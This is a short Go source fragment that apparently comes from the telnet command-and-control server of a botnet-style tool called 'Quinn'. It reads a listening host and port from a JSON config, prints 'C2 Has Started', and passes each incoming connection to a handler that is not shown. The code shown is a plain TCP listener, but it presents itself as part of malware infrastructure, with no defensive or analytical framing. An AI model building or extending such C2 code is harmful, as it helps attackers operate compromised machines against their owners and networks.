func Telnet() {
	now := time.Now()
	Month := now.Month()
	Day := now.Day()
	Year := now.Year()
	Config, err := ioutil.ReadFile("Config/Config.json")
	if err != nil {
		fmt.Printf("%v/%v/%v Error Config.Json Not Found!", Month, Day, Year)
	}
	obj, err := gjson.Parse(Config)
	if err != nil {
		panic(err)
	}
	Host := obj.GetString("TelHost")
	Port := obj.GetString("TelPort")
	Telnet, err := net.Listen("tcp", ""+Host+":"+Port+"")
	if err != nil {
		fmt.Printf("\u001b[37m%v/%v/%v [Quinn] Network Failed To Connect", Month, Day, Year)
	}
	fmt.Printf("\u001b[37m%v/%v/%v [Quinn] C2 Has Started\n\n", Month, Day, Year)
	for {
		conn, err := Telnet.Accept()
		fmt.Printf("\u001b[37m%v/%v/%v [Quinn] Detected New Connection! \n", Month, Day, Year)
		if err != nil {
			fmt.Printf("\u001b[37m%v/%v/%v [Quinn Failed To Accept Connection]", Month, Day, Year)
			fmt.Println(conn)
			return
		}
		go handler(conn)

	}

}
